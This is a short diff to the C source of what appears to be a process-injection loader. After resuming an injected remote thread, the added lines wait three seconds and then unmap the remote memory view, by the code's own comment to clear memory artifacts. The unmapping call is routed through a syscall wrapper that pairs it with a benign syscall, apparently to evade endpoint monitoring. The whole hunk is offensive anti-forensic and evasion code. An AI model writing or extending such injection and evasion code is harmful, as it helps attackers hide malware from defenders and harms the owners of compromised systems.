@@ -468,6 +468,20 @@ int main(int argc, char* argv[])
 		DEBUG_PRINT("[!] NtAlertResumeThread Failed With Error: 0x%0.8X \n", GetLastError());
 		return -1;
 	}
+	
+	// slepp for 3 seconds then unmap to clear memory artifacts
+	Sleep(3000);
+
+	DEBUG_PRINT("[!] Unmapping remote view ...\n");
+
+	// you might wanna wait after this is done before issuing any command
+	SET_SYSCALL(g_SyscallTab.NtUnmapViewOfSection, g_Benign_Syscall_tab.NtCreateFile);
+	if ((status = ExecSyscall(hProcess, lpRemoteMap)))
+	{
+		SET_LAST_NT_ERROR(status);
+		DEBUG_PRINT("[!] NtUnmapViewOfSection Failed With Error: 0x%0.8X \n", GetLastError());
+		return -1;
+	}
 
 	// better to do some more cleanup here...
 	// freeing
